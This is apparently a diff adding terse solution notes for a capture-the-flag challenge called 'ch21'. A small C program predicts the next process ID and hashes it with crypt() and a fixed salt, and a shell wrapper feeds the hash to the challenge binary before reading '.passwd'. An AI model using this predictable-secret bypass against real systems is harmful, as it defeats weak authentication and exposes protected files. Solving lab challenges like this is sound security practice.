@@ -1,0 +1,34 @@
+cd /tmp
+mkdir lol
+cd lol 
+vim pr.c :
+[
+#define _XOPEN_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <crypt.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main ( void ) {
+	    char pid[16];
+
+		snprintf(pid, sizeof(pid), "%i", getpid() + 1);
+	    printf("%s\n", crypt(pid, "$1$awesome"));
+	    return 0;
+}
+]
+
+vim prog
+[
+#!/bin/sh
+
+cd
+./ch21 $(/tmp/lol/a.out)
+]
+
+cc -std=c99 pr.c -lcrypt
+chmod +x prog
+cat - | ./prog
+cat .passwd
